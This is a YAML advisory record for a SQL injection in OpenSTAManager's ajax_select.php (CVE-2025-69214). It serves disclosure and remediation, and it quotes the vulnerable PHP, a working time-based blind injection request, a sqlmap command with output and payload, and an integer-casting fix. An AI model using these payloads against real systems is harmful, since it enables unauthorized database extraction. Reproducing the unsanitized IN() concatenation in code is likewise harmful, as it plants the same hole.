@@ -1,0 +1,211 @@
+advisory_id: GHSA-qjv8-63xq-gq8m
+datasource_id: github_osv/GHSA-qjv8-63xq-gq8m
+datasource_url: https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2026/02/GHSA-qjv8-63xq-gq8m/GHSA-qjv8-63xq-gq8m.json
+aliases:
+  - CVE-2025-69214
+summary: |
+  OpenSTAManager has a SQL Injection in ajax_select.php (componenti endpoint)
+  ## Summary
+  A SQL Injection vulnerability exists in the `ajax_select.php` endpoint when handling the `componenti` operation. An authenticated attacker can inject malicious SQL code through the `options[matricola]` parameter.
+
+  ## Proof of Concept
+
+  ### Vulnerable Code
+  **File:** `modules/impianti/ajax/select.php:122-124`
+
+  ```php
+  case 'componenti':
+      $impianti = $superselect['matricola'];
+      if (!empty($impianti)) {
+          $where[] = '`my_componenti`.`id_impianto` IN ('.$impianti.')';
+      }
+  ```
+
+  ### Data Flow
+  1. **Source:** `$_GET['options']['matricola']` → `$superselect['matricola']`
+  2. **Vulnerable:** User input concatenated directly into `IN()` clause without sanitization
+  3. **Sink:** Query executed via AJAX framework
+
+  ### Exploit
+
+  **Manual PoC (Time-based Blind SQLi):**
+  ```http
+  GET /ajax_select.php?op=componenti&options[matricola]=1) AND (SELECT 1 FROM (SELECT(SLEEP(5)))a) AND (1 HTTP/1.1
+  Host: localhost:8081
+  Cookie: PHPSESSID=<valid-session>
+  ```
+  <img width="1306" height="581" alt="image" src="https://github.com/user-attachments/assets/238015dd-5644-4eed-ae8f-864dc0073011" />
+
+  **SQLMap Exploitation:**
+  ```bash
+  sqlmap -u 'http://localhost:8081/ajax_select.php?op=componenti&options[matricola]=1*' \
+    --cookie="PHPSESSID=<session>" \
+    --dbms=MySQL \
+    --technique=T \
+    --level=3 \
+    --risk=3
+  ```
+
+  **SQLMap Output:**
+  ```
+  [INFO] URI parameter '#1*' appears to be 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)' injectable
+  Parameter: #1* (URI)
+      Type: time-based blind
+      Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
+      Payload: options[matricola]=1) AND (SELECT 7438 FROM (SELECT(SLEEP(5)))grko)-- SvRI
+  back-end DBMS: MySQL >= 5.0.12
+  ```
+  <img width="1228" height="801" alt="image" src="https://github.com/user-attachments/assets/b0b7078b-09a7-4e53-956c-baf1d09ed59b" />
+
+  ## Impact
+  - **Data Exfiltration:** Time-based blind SQL Injection allows complete database extraction
+  - **Authentication Bypass:** Access to sensitive component and equipment data
+  - **Data Manipulation:** Potential unauthorized modification of records
+
+  ## Remediation
+
+  Cast values to integers before using in SQL:
+
+  **Before:**
+  ```php
+  $impianti = $superselect['matricola'];
+  if (!empty($impianti)) {
+      $where[] = '`my_componenti`.`id_impianto` IN ('.$impianti.')';
+  }
+  ```
+
+  **After:**
+  ```php
+  $impianti = $superselect['matricola'];
+  if (!empty($impianti)) {
+      $ids = array_map('intval', explode(',', $impianti));
+      $where[] = '`my_componenti`.`id_impianto` IN ('.implode(',', $ids).')';
+  }
+  ```
+
+  ## Credit
+  Discovered by: Łukasz Rybak
+impacted_packages:
+  - purl: pkg:composer/devcode-it/openstamanager
+    affected_versions: vers:composer/<=2.9.8
+    fixed_versions:
+    affected_packages:
+      - pkg:composer/devcode-it/openstamanager@2.3.0
+      - pkg:composer/devcode-it/openstamanager@2.4.0
+      - pkg:composer/devcode-it/openstamanager@2.4.1
+      - pkg:composer/devcode-it/openstamanager@2.4.2
+      - pkg:composer/devcode-it/openstamanager@2.4.3
+      - pkg:composer/devcode-it/openstamanager@2.4.4
+      - pkg:composer/devcode-it/openstamanager@2.4.5
+      - pkg:composer/devcode-it/openstamanager@2.4.6
+      - pkg:composer/devcode-it/openstamanager@2.4.7
+      - pkg:composer/devcode-it/openstamanager@2.4.8
+      - pkg:composer/devcode-it/openstamanager@2.4.9
+      - pkg:composer/devcode-it/openstamanager@2.4.10
+      - pkg:composer/devcode-it/openstamanager@2.4.11
+      - pkg:composer/devcode-it/openstamanager@2.4.12
+      - pkg:composer/devcode-it/openstamanager@2.4.13
+      - pkg:composer/devcode-it/openstamanager@2.4.14
+      - pkg:composer/devcode-it/openstamanager@2.4.15
+      - pkg:composer/devcode-it/openstamanager@2.4.16
+      - pkg:composer/devcode-it/openstamanager@2.4.17
+      - pkg:composer/devcode-it/openstamanager@2.4.17%2B1
+      - pkg:composer/devcode-it/openstamanager@2.4.18
+      - pkg:composer/devcode-it/openstamanager@2.4.19
+      - pkg:composer/devcode-it/openstamanager@2.4.20
+      - pkg:composer/devcode-it/openstamanager@2.4.21
+      - pkg:composer/devcode-it/openstamanager@2.4.22
+      - pkg:composer/devcode-it/openstamanager@2.4.23
+      - pkg:composer/devcode-it/openstamanager@2.4.24
+      - pkg:composer/devcode-it/openstamanager@2.4.25
+      - pkg:composer/devcode-it/openstamanager@2.4.26
+      - pkg:composer/devcode-it/openstamanager@2.4.27
+      - pkg:composer/devcode-it/openstamanager@2.4.28
+      - pkg:composer/devcode-it/openstamanager@2.4.29
+      - pkg:composer/devcode-it/openstamanager@2.4.30
+      - pkg:composer/devcode-it/openstamanager@2.4.31
+      - pkg:composer/devcode-it/openstamanager@2.4.32
+      - pkg:composer/devcode-it/openstamanager@2.4.33
+      - pkg:composer/devcode-it/openstamanager@2.4.34
+      - pkg:composer/devcode-it/openstamanager@2.4.35
+      - pkg:composer/devcode-it/openstamanager@2.4.36
+      - pkg:composer/devcode-it/openstamanager@2.4.37
+      - pkg:composer/devcode-it/openstamanager@2.4.38
+      - pkg:composer/devcode-it/openstamanager@2.4.39
+      - pkg:composer/devcode-it/openstamanager@2.4.40
+      - pkg:composer/devcode-it/openstamanager@2.4.41
+      - pkg:composer/devcode-it/openstamanager@2.4.42
+      - pkg:composer/devcode-it/openstamanager@2.4.43
+      - pkg:composer/devcode-it/openstamanager@2.4.44
+      - pkg:composer/devcode-it/openstamanager@2.4.45
+      - pkg:composer/devcode-it/openstamanager@2.4.46
+      - pkg:composer/devcode-it/openstamanager@2.4.47
+      - pkg:composer/devcode-it/openstamanager@2.4.48
+      - pkg:composer/devcode-it/openstamanager@2.4.49
+      - pkg:composer/devcode-it/openstamanager@2.4.50
+      - pkg:composer/devcode-it/openstamanager@2.4.51
+      - pkg:composer/devcode-it/openstamanager@2.4.52
+      - pkg:composer/devcode-it/openstamanager@2.4.53
+      - pkg:composer/devcode-it/openstamanager@2.4.54
+      - pkg:composer/devcode-it/openstamanager@2.5.0
+      - pkg:composer/devcode-it/openstamanager@2.5.1-beta
+      - pkg:composer/devcode-it/openstamanager@2.5.2-beta
+      - pkg:composer/devcode-it/openstamanager@2.5.3
+      - pkg:composer/devcode-it/openstamanager@2.5.4
+      - pkg:composer/devcode-it/openstamanager@2.5.5
+      - pkg:composer/devcode-it/openstamanager@2.5.6
+      - pkg:composer/devcode-it/openstamanager@2.5.7
+      - pkg:composer/devcode-it/openstamanager@2.6.0-beta
+      - pkg:composer/devcode-it/openstamanager@2.6.1
+      - pkg:composer/devcode-it/openstamanager@2.6.2
+      - pkg:composer/devcode-it/openstamanager@2.7.0-beta
+      - pkg:composer/devcode-it/openstamanager@2.7.0
+      - pkg:composer/devcode-it/openstamanager@2.7.1
+      - pkg:composer/devcode-it/openstamanager@2.7.2
+      - pkg:composer/devcode-it/openstamanager@2.7.3
+      - pkg:composer/devcode-it/openstamanager@2.8.0-beta
+      - pkg:composer/devcode-it/openstamanager@2.8.1
+      - pkg:composer/devcode-it/openstamanager@2.8.2
+      - pkg:composer/devcode-it/openstamanager@2.8.3
+      - pkg:composer/devcode-it/openstamanager@2.9.0-beta
+      - pkg:composer/devcode-it/openstamanager@2.9.0
+      - pkg:composer/devcode-it/openstamanager@2.9.1
+      - pkg:composer/devcode-it/openstamanager@2.9.2
+      - pkg:composer/devcode-it/openstamanager@2.9.3
+      - pkg:composer/devcode-it/openstamanager@2.9.4
+      - pkg:composer/devcode-it/openstamanager@2.9.5
+      - pkg:composer/devcode-it/openstamanager@2.9.6
+      - pkg:composer/devcode-it/openstamanager@2.9.7
+      - pkg:composer/devcode-it/openstamanager@2.9.8
+    fixed_packages: []
+    fixed_in_commits: []
+    introduced_in_commits: []
+severities:
+  - score: '8.8'
+    scoring_system: cvssv3.1
+    scoring_elements: CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H
+    published_at:
+    url: https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2026/02/GHSA-qjv8-63xq-gq8m/GHSA-qjv8-63xq-gq8m.json
+  - score: '8.7'
+    scoring_system: cvssv4
+    scoring_elements: CVSS:4.0/AV:N/AC:L/AT:N/PR:L/UI:N/VC:H/VI:H/VA:H/SC:N/SI:N/SA:N
+    published_at:
+    url: https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2026/02/GHSA-qjv8-63xq-gq8m/GHSA-qjv8-63xq-gq8m.json
+  - score: HIGH
+    scoring_system: generic_textual
+    scoring_elements:
+    published_at:
+    url:
+weaknesses:
+  - CWE-89
+references:
+  - url: https://github.com/devcode-it/openstamanager
+    reference_type:
+    reference_id:
+  - url: https://nvd.nist.gov/vuln/detail/CVE-2025-69214
+    reference_type:
+    reference_id: CVE-2025-69214
+  - url: https://github.com/devcode-it/openstamanager/security/advisories/GHSA-qjv8-63xq-gq8m
+    reference_type:
+    reference_id: GHSA-qjv8-63xq-gq8m
+exploits: []
